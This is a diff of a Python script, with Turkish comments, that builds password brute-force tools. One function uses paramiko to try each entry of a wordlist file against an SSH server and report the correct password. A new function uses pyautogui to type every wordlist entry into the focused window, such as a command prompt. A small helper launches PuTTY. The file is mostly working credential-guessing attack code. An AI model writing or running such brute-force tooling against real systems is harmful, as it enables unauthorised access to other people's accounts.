@@ -1,5 +1,6 @@
-import re, pyautogui,paramiko,time
-
+import re,paramiko,time,sys
+import pyautogui as pa
+import subprocess as sp
 # Python 3.7 32-bit
 # pip install pyautogui
 # pip install paramiko
@@ -70,7 +71,7 @@ def readSifreler():
 #            continue       
 #    sifrelertxt.close()
 
-def bruteForceAttack():
+def bruteForceAttackSSH():
     conn = paramiko.SSHClient()
     conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     sifrelertxt=open("sifreler.txt","r")
@@ -82,3 +83,24 @@ def bruteForceAttack():
             print("Doğru Şifre: " + key)
             break
     sifrelertxt.close()
+
+def bruteForceAttackCMD():
+    time.sleep(4) # Çalıştırdığın anda cmd yi aç
+    sifrelertxt=open("sifreler.txt","r")
+    i=0
+    for x in sifrelertxt:
+        key=x.replace('\n', '')
+        print(str(i)+". Key:")
+        pa.write(key)
+        pa.press("enter")
+        i+=1
+        
+    sifrelertxt.close()
+
+
+puttyPath='C:\\Program Files\\PuTTY\\putty.exe'
+
+def puttyTest():
+    sp.Popen(puttyPath)
+
+#puttyTest()
